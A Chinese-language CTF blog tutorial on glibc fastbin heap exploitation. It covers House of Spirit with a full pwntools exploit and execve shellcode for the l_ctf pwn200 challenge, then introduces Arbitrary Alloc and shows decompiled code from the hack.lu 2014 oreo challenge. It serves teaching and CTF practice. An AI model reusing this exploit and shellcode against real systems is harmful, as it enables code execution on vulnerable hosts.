<h2 id="House-of-Spirit"><a href="#House-of-Spirit" class="headerlink" title="House of Spirit"></a>House of Spirit</h2><h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>House of Spirit 是 <code>the Malloc Maleficarum</code> 中的一种技术。</p>
<p>该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配<strong>指定地址</strong>的 chunk 的目的。</p>
<p>要想构造 fastbin fake chunk，并且将其释放时，可以将其放入到对应的 fastbin 链表中，需要绕过一些必要的检测，这里我们看一下它的源码。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void</span><br><span class="line">  public_fREe(Void_t* mem)</span><br><span class="line">  &#123;</span><br><span class="line">    mstate ar_ptr;</span><br><span class="line">    mchunkptr p;                          &#x2F;* chunk corresponding to mem *&#x2F;</span><br><span class="line">   </span><br><span class="line">    [...]</span><br><span class="line">   </span><br><span class="line">    p &#x3D; mem2chunk(mem);</span><br><span class="line">  </span><br><span class="line"> #if HAVE_MMAP</span><br><span class="line">   if (chunk_is_mmapped(p))                       &#x2F;*首先M标志位不能被置上才能绕过。release mmapped memory. *&#x2F;</span><br><span class="line">   &#123;</span><br><span class="line">     munmap_chunk(p);</span><br><span class="line">     return;</span><br><span class="line">   &#125;</span><br><span class="line"> #endif</span><br><span class="line">  </span><br><span class="line">   ar_ptr &#x3D; arena_for_chunk(p);</span><br><span class="line">  </span><br><span class="line">   [...]</span><br><span class="line">  </span><br><span class="line">   _int_free(ar_ptr, mem);</span><br></pre></td></tr></table></figure>

<p>首先mmap标志位不能被置上，否则会直接调用munmap_chunk函数去释放堆块。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> void</span><br><span class="line"> _int_free(mstate av, Void_t* mem)</span><br><span class="line"> &#123;</span><br><span class="line">   mchunkptr       p;           &#x2F;* chunk corresponding to mem *&#x2F;</span><br><span class="line">   INTERNAL_SIZE_T size;        &#x2F;* its size *&#x2F;</span><br><span class="line">   mfastbinptr*    fb;          &#x2F;* associated fastbin *&#x2F;</span><br><span class="line">  </span><br><span class="line">   [...]</span><br><span class="line">  </span><br><span class="line">  p &#x3D; mem2chunk(mem);</span><br><span class="line">  size &#x3D; chunksize(p);</span><br><span class="line"> </span><br><span class="line">  [...]</span><br><span class="line"> </span><br><span class="line">  &#x2F;*</span><br><span class="line">    If eligible, place chunk on a fastbin so it can be found</span><br><span class="line">    and used quickly in malloc.</span><br><span class="line">  *&#x2F;</span><br><span class="line"> </span><br><span class="line">  if ((unsigned long)(size) &lt;&#x3D; (unsigned long)(av-&gt;max_fast)   &#x2F;*其次，size的大小不能超过fastbin的最大值*&#x2F;</span><br><span class="line"> </span><br><span class="line">#if TRIM_FASTBINS</span><br><span class="line">      &#x2F;*</span><br><span class="line">       If TRIM_FASTBINS set, don&#39;t place chunks</span><br><span class="line">       bordering top into fastbins</span><br><span class="line">      *&#x2F;</span><br><span class="line">      &amp;&amp; (chunk_at_offset(p, size) !&#x3D; av-&gt;top)</span><br><span class="line">#endif</span><br><span class="line">      ) &#123;</span><br><span class="line"> </span><br><span class="line">    if (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;&#x3D; 2 * SIZE_SZ, 0)</span><br><span class="line">       || __builtin_expect (chunksize (chunk_at_offset (p, size))</span><br><span class="line">                         &gt;&#x3D; av-&gt;system_mem, 0))                        &#x2F;*最后是下一个堆块的大小，要大于2*SIZE_ZE小于system_mem*&#x2F;</span><br><span class="line">      &#123;</span><br><span class="line">       errstr &#x3D; &quot;free(): invalid next size (fast)&quot;;</span><br><span class="line">       goto errout;</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">    [...]</span><br><span class="line">    fb &#x3D; &amp;(av-&gt;fastbins[fastbin_index(size)]);</span><br><span class="line">    [...]</span><br><span class="line">    p-&gt;fd &#x3D; *fb;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>其次是伪造堆块的size字段不能超过fastbin的最大值，超过的话，就不会释放到fastbin里面了。</p>
<p>最后是下一个堆块的大小，要大于2*SIZE_ZE小于system_mem,否则会报invalid next size的错误。</p>
<p>这里总结一下利用House Of Spirirt需要的条件</p>
<ul>
<li>fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。</li>
<li>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK</li>
<li>fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。</li>
<li>fake chunk 的 next chunk 的大小不能小于 <code>2 * SIZE_SZ</code>，同时也不能大于<code>av-&gt;system_mem</code> 。</li>
<li>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。</li>
</ul>
<p>我们画个图来理解一下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-----------------</span><br><span class="line">| 可控区域1      |</span><br><span class="line">-----------------</span><br><span class="line">| 目标区域       |     一般是函数指针，或者是返回地址</span><br><span class="line">-----------------</span><br><span class="line">| 可控区域2      |</span><br><span class="line">-----------------</span><br></pre></td></tr></table></figure>

<p>1、这里我们需要在可控区域1中伪造一个fake_chunk，这个fake_chunk的ISMMAP 位不能为 1，地址需要对齐，size需要是fastbin chunk的大小，也需要对齐地址。而且fake_chunk需要将目标区域包括进去。</p>
<p>2、在可控区域2这里需要有fake_chunk的next_size，next chunk 的大小不能小于 <code>2 * SIZE_SZ</code>，同时也不能大于<code>av-&gt;system_mem(128kb)</code>，需要注意的是fake_chunk和next_chunk在物理上是相邻的。</p>
<h3 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h3><ul>
<li>可以泄露栈上地址</li>
<li>可以覆盖堆指针</li>
<li>想要控制的目标区域的前段空间与后段空间都是可控的内存区域</li>
</ul>
<h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><ol>
<li>在可控区域1伪造chunk，目的是为了可以控制目标区域</li>
<li>修改堆指针指向fake_chunk</li>
<li>free掉堆指针</li>
<li>malloc回来刚才free掉的chunk，最终使得可以往目标区域中写入数据，实现目的。</li>
</ol>
<p>这里我们以一道例题来举例。</p>
<h3 id="l-ctf-pwn200"><a href="#l-ctf-pwn200" class="headerlink" title="l_ctf_pwn200"></a>l_ctf_pwn200</h3><h4 id="checksec检查：-1"><a href="#checksec检查：-1" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>

<h4 id="main函数如下：-1"><a href="#main函数如下：-1" class="headerlink" title="main函数如下："></a>main函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  sub_40079D();</span><br><span class="line">  sub_400A8E();</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="sub-400A8E函数如下："><a href="#sub-400A8E函数如下：" class="headerlink" title="sub_400A8E函数如下："></a>sub_400A8E函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int sub_400A8E()</span><br><span class="line">&#123;</span><br><span class="line">  signed __int64 i; &#x2F;&#x2F; [sp+10h] [bp-40h]@1</span><br><span class="line">  char v2[48]; &#x2F;&#x2F; [sp+20h] [bp-30h]@2</span><br><span class="line"></span><br><span class="line">  puts(&quot;who are u?&quot;);</span><br><span class="line">  for ( i &#x3D; 0LL; i &lt;&#x3D; 47; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    read(0, &amp;v2[i], 1uLL);</span><br><span class="line">    if ( v2[i] &#x3D;&#x3D; 10 )</span><br><span class="line">    &#123;</span><br><span class="line">      v2[i] &#x3D; 0;</span><br><span class="line">      break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  printf(&quot;%s, welcome to xdctf~\n&quot;, v2);</span><br><span class="line">  puts(&quot;give me your id ~~?&quot;);</span><br><span class="line">  sub_4007DF();</span><br><span class="line">  return sub_400A29();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>程序在<code>int sub_400A8E()</code>存在一个off by one的漏洞，当输入48个字符的时候，会连带着将RBP里的值打印出来。这是因为read函数读取字符串的时候不会在末尾加上<code>\x00</code>。这就满足HOS利用条件之一<code>泄露栈地址</code>。</p>
<h4 id="sub-400A29函数如下："><a href="#sub-400A29函数如下：" class="headerlink" title="sub_400A29函数如下："></a>sub_400A29函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int sub_400A29()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; &#x2F;&#x2F; [sp+0h] [bp-40h]@1</span><br><span class="line">  char *dest; &#x2F;&#x2F; [sp+38h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  dest &#x3D; (char *)malloc(0x40uLL);</span><br><span class="line">  puts(&quot;give me money~&quot;);</span><br><span class="line">  read(0, &amp;buf, 0x40uLL);</span><br><span class="line">  strcpy(dest, &amp;buf);</span><br><span class="line">  ptr &#x3D; dest;</span><br><span class="line">  return sub_4009C4();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<code>int sub_400A29()</code>中，由于buf的大小只有 0x40-0x8 = 0x38，但是却读入了0x40字节，会覆盖掉dest的指针，而dest是一个堆指针，这样就满足了HOS利用条件之一<code>存在可将堆变量指针覆盖指向为可控区域</code></p>
<h4 id="sub-4009C4函数如下："><a href="#sub-4009C4函数如下：" class="headerlink" title="sub_4009C4函数如下："></a>sub_4009C4函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int sub_4009C4()</span><br><span class="line">&#123;</span><br><span class="line">  int v0; &#x2F;&#x2F; eax@1</span><br><span class="line"></span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_4009AF();</span><br><span class="line">      v0 &#x3D; sub_4007DF();</span><br><span class="line">      if ( v0 !&#x3D; 2 )</span><br><span class="line">        break;</span><br><span class="line">      free_();</span><br><span class="line">    &#125;</span><br><span class="line">    if ( v0 &#x3D;&#x3D; 3 )</span><br><span class="line">      break;</span><br><span class="line">    if ( v0 &#x3D;&#x3D; 1 )</span><br><span class="line">      add();</span><br><span class="line">    else</span><br><span class="line">      puts(&quot;invalid choice&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return puts(&quot;good bye~&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="free函数如下："><a href="#free函数如下：" class="headerlink" title="free函数如下："></a>free函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void free_()</span><br><span class="line">&#123;</span><br><span class="line">  if ( ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;out~&quot;);</span><br><span class="line">    free(ptr);</span><br><span class="line">    ptr &#x3D; 0LL;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;havn&#39;t check in&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="add函数如下：-1"><a href="#add函数如下：-1" class="headerlink" title="add函数如下："></a>add函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int add()</span><br><span class="line">&#123;</span><br><span class="line">  int result; &#x2F;&#x2F; eax@4</span><br><span class="line">  int nbytes; &#x2F;&#x2F; [sp+Ch] [bp-4h]@2</span><br><span class="line"></span><br><span class="line">  if ( ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    result &#x3D; puts(&quot;already check in&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;how long?&quot;);</span><br><span class="line">    nbytes &#x3D; sub_4007DF();</span><br><span class="line">    if ( nbytes &lt;&#x3D; 0 || nbytes &gt; 128 )</span><br><span class="line">    &#123;</span><br><span class="line">      result &#x3D; puts(&quot;invalid length&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      ptr &#x3D; malloc(nbytes);</span><br><span class="line">      printf(&quot;give me more money : &quot;);</span><br><span class="line">      printf(&quot;\n%d\n&quot;, (unsigned int)nbytes);</span><br><span class="line">      read(0, ptr, (unsigned int)nbytes);</span><br><span class="line">      result &#x3D; puts(&quot;in~&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>还有一个利用条件是在 <code>int sub_400A8E()</code>函数中输入ID哪里，因为IDA反编译的问题没有显示出来。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:0000000000400B10                 mov     edi, offset aGiveMeYourId? ; &quot;give me your id ~~?&quot;</span><br><span class="line">.text:0000000000400B15                 call    _puts</span><br><span class="line">.text:0000000000400B1A                 mov     eax, 0</span><br><span class="line">.text:0000000000400B1F                 call    sub_4007DF</span><br><span class="line">.text:0000000000400B24                 cdqe</span><br><span class="line">.text:0000000000400B26                 mov     [rbp+var_38], rax    &lt;---可以看到这里RAX中保存的就是ID</span><br><span class="line">.text:0000000000400B2A                 mov     eax, 0</span><br><span class="line">.text:0000000000400B2F                 call    sub_400A29</span><br></pre></td></tr></table></figure>

<p>这样就满足了HOS的所有利用条件，构成了上面我们在图上看到的那样。我们再看一下程序整个的栈结构。</p>
<h4 id="栈结构"><a href="#栈结构" class="headerlink" title="栈结构"></a>栈结构</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+--------------+     -----</span><br><span class="line">|  money(0x38) | &lt;-     ↓  实际可读入0x40</span><br><span class="line">----------------     sub_400A29()函数栈帧(0x40)</span><br><span class="line">|    dest      |        ↑</span><br><span class="line">----------------      -----    </span><br><span class="line">|    RBP       |        </span><br><span class="line">----------------        </span><br><span class="line">|    RIP       |         </span><br><span class="line">+--------------+      -----</span><br><span class="line">|     .....    | 0x18   ↓  </span><br><span class="line">----------------        ↓</span><br><span class="line">|     ID       |     sub_400A8E()函数栈帧(0x50) </span><br><span class="line">----------------        ↑</span><br><span class="line">|   name(0x30) |        ↑</span><br><span class="line">-----------------     -----  </span><br><span class="line">|    RBP       |    这里存的是main函数的RBP </span><br><span class="line">----------------        </span><br><span class="line">|    RIP       |        </span><br><span class="line">+--------------+       --↓--</span><br><span class="line">|   .......    |        main函数栈帧(0x10)</span><br><span class="line">----------------       --↑--</span><br><span class="line">|    RBP       |        </span><br><span class="line">----------------        </span><br><span class="line">|    RIP       |         </span><br><span class="line">+--------------+</span><br></pre></td></tr></table></figure>

<p>这就形成了我们上面看到的情况：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-----------------</span><br><span class="line">|  money(0x38)  |  &lt;--可控区域1</span><br><span class="line">-----------------</span><br><span class="line">|    RBP        |</span><br><span class="line">-----------------  &lt;--目标区域</span><br><span class="line">|    RIP        |</span><br><span class="line">----------------- </span><br><span class="line">|    ID         |  &lt;--可控区域2</span><br><span class="line">-----------------</span><br></pre></td></tr></table></figure>

<h4 id="利用思路：-1"><a href="#利用思路：-1" class="headerlink" title="利用思路："></a>利用思路：</h4><ol>
<li>将shellcode作为name输入进去，填充满48个字符，泄露RBP</li>
<li>输入ID为next_size</li>
<li>在输入money的地方，我们伪造fake_chunk，并且覆盖dest指针为我们fake_chunk的地址</li>
<li>free掉fake_chunk，再将fake_chunk申请回来，并且将RIP修改为shellcode_addr。</li>
<li>退出程序，getshell。</li>
</ol>
<h4 id="exp如下：-1"><a href="#exp如下：-1" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&#39;.&#x2F;pwn200&#39;)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;pwn200&#39;)</span><br><span class="line">libc&#x3D;elf.libc</span><br><span class="line"></span><br><span class="line">def add(size,content) :</span><br><span class="line">	sh.recvuntil(&#39;: &#39;)</span><br><span class="line">	sh.sendline(&#39;1&#39;)</span><br><span class="line">	sh.recvuntil(&#39;\n&#39;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil(&#39;\n&#39;)</span><br><span class="line">	sh.send(content)</span><br><span class="line">def free() :</span><br><span class="line">        sh.recvuntil(&#39;: &#39;)</span><br><span class="line">        sh.sendline(&#39;2&#39;)</span><br><span class="line">def exit() :</span><br><span class="line">        sh.recvuntil(&#39;: &#39;)</span><br><span class="line">        sh.sendline(&#39;3&#39;)</span><br><span class="line"></span><br><span class="line">shellcode &#x3D; &quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span><br><span class="line">sh.recvuntil(&#39;who are u?\n&#39;)</span><br><span class="line">sh.send(shellcode.ljust(46,&#39;a&#39;)+&#39;bb&#39;)</span><br><span class="line">sh.recvuntil(&#39;bb&#39;)</span><br><span class="line">rbp_addr&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">log.success(&#39;rbp_addr:&#39; +hex(rbp_addr))</span><br><span class="line"></span><br><span class="line">shellcode_addr&#x3D;rbp_addr-0x50</span><br><span class="line">fake_addr&#x3D;rbp_addr-0x90</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;give me your id ~~?&#39;)</span><br><span class="line">sh.sendline(&#39;48&#39;)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;money~&#39;)</span><br><span class="line">payload &#x3D; p64(0) * 5 + p64(0x41) </span><br><span class="line">payload &#x3D; payload.ljust(0x38, &#39;\x00&#39;) + p64(fake_addr) </span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">free()</span><br><span class="line">add(0x30,p64(0)*3+p64(shellcode_addr))</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">exit()</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="Alloc-to-Stack"><a href="#Alloc-to-Stack" class="headerlink" title="Alloc to Stack"></a>Alloc to Stack</h2><p>该技术的核心点在于劫持 fastbin 链表中 chunk 的 fd 指针，把 fd 指针指向我们想要分配的栈上，从而实现控制栈中的一些关键数据，比如返回地址等。</p>
<p>通过该技术我们可以把 fastbin chunk 分配到栈中，从而控制返回地址等关键数据。要实现这一点我们需要劫持 fastbin 中 chunk 的 fd 域，把它指到栈上，当然同时需要栈上存在有满足条件的 size 值。</p>
<h2 id="Arbitrary-Alloc"><a href="#Arbitrary-Alloc" class="headerlink" title="Arbitrary Alloc"></a>Arbitrary Alloc</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>Arbitrary Alloc 其实与 Alloc to stack 是完全相同的，唯一的区别是分配的目标不再是栈中。 事实上只要满足目标地址存在合法的 size 域（这个 size 域是构造的，还是自然存在的都无妨），我们可以把 chunk 分配到任意的可写内存中，比如 bss、heap、data、stack 等等。</p>
<p>因为Alloc to Stack和Arbitrary Alloc利用原理是一样的，这里就只介绍Arbitrary Alloc。</p>
<h3 id="利用条件-2"><a href="#利用条件-2" class="headerlink" title="利用条件"></a>利用条件</h3><ul>
<li>类似于堆溢出漏洞这样的类型，可以劫持fd指针</li>
</ul>
<p>我找了几道这样类型的题，演示一下</p>
<h3 id="2014-hack-lu-oreo"><a href="#2014-hack-lu-oreo" class="headerlink" title="2014 hack.lu oreo"></a>2014 hack.lu oreo</h3><h4 id="checksec检查"><a href="#checksec检查" class="headerlink" title="checksec检查"></a>checksec检查</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<h4 id="mian函数如下："><a href="#mian函数如下：" class="headerlink" title="mian函数如下："></a>mian函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int __cdecl main()</span><br><span class="line">&#123;</span><br><span class="line">  int v0; &#x2F;&#x2F; ST1C_4@1</span><br><span class="line">  int result; &#x2F;&#x2F; eax@1</span><br><span class="line">  int v2; &#x2F;&#x2F; edx@1</span><br><span class="line"></span><br><span class="line">  v0 &#x3D; *MK_FP(__GS__, 20);</span><br><span class="line">  number &#x3D; 0;</span><br><span class="line">  dword_804A2A0 &#x3D; 0;</span><br><span class="line">  dword_804A2A8 &#x3D; (char *)&amp;unk_804A2C0;</span><br><span class="line">  puts(&quot;Welcome to the OREO Original Rifle Ecommerce Online System!&quot;);</span><br><span class="line">  puts(&quot;\n     ,______________________________________\n    |_________________,----------._ [____]  -,__  __....-----&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n                   (_(||||||||||||)___________&#x2F;                   |\n                      &#96;----------&#39;   OREO [ ))\&quot;-,                   |\n                                           \&quot;\&quot;    &#96;,  _,--....___    |\n                                                   &#96;&#x2F;           \&quot;\&quot;\&quot;\&quot;\n\t&quot;);</span><br><span class="line">  sub_804898D();</span><br><span class="line">  result &#x3D; 0;</span><br><span class="line">  v2 &#x3D; *MK_FP(__GS__, 20) ^ v0;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="sub-804898D函数如下："><a href="#sub-804898D函数如下：" class="headerlink" title="sub_804898D函数如下："></a>sub_804898D函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int sub_804898D()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; &#x2F;&#x2F; [sp+1Ch] [bp-Ch]@1</span><br><span class="line"></span><br><span class="line">  v1 &#x3D; *MK_FP(__GS__, 20);</span><br><span class="line">  puts(&quot;What would you like to do?\n&quot;);</span><br><span class="line">  printf(&quot;%u. Add new rifle\n&quot;, 1);</span><br><span class="line">  printf(&quot;%u. Show added rifles\n&quot;, 2);</span><br><span class="line">  printf(&quot;%u. Order selected rifles\n&quot;, 3);</span><br><span class="line">  printf(&quot;%u. Leave a Message with your Order\n&quot;, 4);</span><br><span class="line">  printf(&quot;%u. Show current stats\n&quot;, 5);</span><br><span class="line">  printf(&quot;%u. Exit!\n&quot;, 6);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    switch ( get_number() )</span><br><span class="line">    &#123;</span><br><span class="line">      default:</span><br><span class="line">        continue;</span><br><span class="line">      case 1:</span><br><span class="line">        Add_new_rifle();</span><br><span class="line">        break;</span><br><span class="line">      case 2:</span><br><span class="line">        Show_added_rifles();</span><br><span class="line">        break;</span><br><span class="line">      case 3:</span><br><span class="line">        delete_rifles();</span><br><span class="line">        break;</span><br><span class="line">      case 4:</span><br><span class="line">        Enter_Message();</span><br><span class="line">        break;</span><br><span class="line">      case 5:</span><br><span class="line">        Show_current_stats();</span><br><span class="line">        break;</span><br><span class="line">      case 6:</span><br><span class="line">        return *MK_FP(__GS__, 20) ^ v1;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Add-new-rifle函数如下："><a href="#Add-new-rifle函数如下：" class="headerlink" title="Add_new_rifle函数如下："></a>Add_new_rifle函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int sub_8048644()</span><br><span class="line">&#123;</span><br><span class="line">  char *v1; &#x2F;&#x2F; [sp+18h] [bp-10h]@1</span><br><span class="line">  int v2; &#x2F;&#x2F; [sp+1Ch] [bp-Ch]@1</span><br><span class="line"></span><br><span class="line">  v2 &#x3D; *MK_FP(__GS__, 20);</span><br><span class="line">  v1 &#x3D; last_heap;</span><br><span class="line">  last_heap &#x3D; (char *)malloc(0x38u);</span><br><span class="line">  if ( last_heap )</span><br><span class="line">  &#123;</span><br><span class="line">    *((_DWORD *)last_heap + 13) &#x3D; v1;</span><br><span class="line">    printf(&quot;Rifle name: &quot;);</span><br><span class="line">    fgets(last_heap + 25, 56, stdin);</span><br><span class="line">    sub_80485EC(last_heap + 25);</span><br><span class="line">    printf(&quot;Rifle description: &quot;);</span><br><span class="line">    fgets(last_heap, 56, stdin);</span><br><span class="line">    sub_80485EC(last_heap);</span><br><span class="line">    ++number;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Something terrible happened!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return *MK_FP(__GS__, 20) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Show-added-rifles函数如下："><a href="#Show-added-rifles函数如下：" class="headerlink" title="Show_added_rifles函数如下："></a>Show_added_rifles函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int Show_added_rifles()</span><br><span class="line">&#123;</span><br><span class="line">  char *i; &#x2F;&#x2F; [sp+14h] [bp-14h]@1</span><br><span class="line">  int v2; &#x2F;&#x2F; [sp+1Ch] [bp-Ch]@1</span><br><span class="line"></span><br><span class="line">  v2 &#x3D; *MK_FP(__GS__, 20);</span><br><span class="line">  printf(&quot;Rifle to be ordered:\n%s\n&quot;, &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;);</span><br><span class="line">  for ( i &#x3D; last_heap; i; i &#x3D; (char *)*((_DWORD *)i + 13) )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Name: %s\n&quot;, i + 25);</span><br><span class="line">    printf(&quot;Description: %s\n&quot;, i);</span><br><span class="line">    puts(&quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return *MK_FP(__GS__, 20) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="delete-rifles函数如下："><a href="#delete-rifles函数如下：" class="headerlink" title="delete_rifles函数如下："></a>delete_rifles函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int sub_8048810()</span><br><span class="line">&#123;</span><br><span class="line">  char *ptr; &#x2F;&#x2F; ST18_4@3</span><br><span class="line">  char *v2; &#x2F;&#x2F; [sp+14h] [bp-14h]@1</span><br><span class="line">  int v3; &#x2F;&#x2F; [sp+1Ch] [bp-Ch]@1</span><br><span class="line"></span><br><span class="line">  v3 &#x3D; *MK_FP(__GS__, 20);</span><br><span class="line">  v2 &#x3D; last_heap;</span><br><span class="line">  if ( number )</span><br><span class="line">  &#123;</span><br><span class="line">    while ( v2 )</span><br><span class="line">    &#123;</span><br><span class="line">      ptr &#x3D; v2;</span><br><span class="line">      v2 &#x3D; (char *)*((_DWORD *)v2 + 13);</span><br><span class="line">      free(ptr);</span><br><span class="line">    &#125;</span><br><span class="line">    last_heap &#x3D; 0;</span><br><span class="line">    ++dword_804A2A0;</span><br><span class="line">    puts(&quot;Okay order submitted!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;No rifles to be ordered!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return *MK_FP(__GS__, 20) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Enter-Message函数如下："><a href="#Enter-Message函数如下：" class="headerlink" title="Enter_Message函数如下："></a>Enter_Message函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int sub_80487B4()</span><br><span class="line">&#123;</span><br><span class="line">  int v0; &#x2F;&#x2F; ST1C_4@1</span><br><span class="line"></span><br><span class="line">  v0 &#x3D; *MK_FP(__GS__, 20);</span><br><span class="line">  printf(&quot;Enter any notice you&#39;d like to submit with your order: &quot;);</span><br><span class="line">  fgets(dword_804A2A8, 128, stdin);</span><br><span class="line">  sub_80485EC(dword_804A2A8);</span><br><span class="line">  return *MK_FP(__GS__, 20) ^ v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

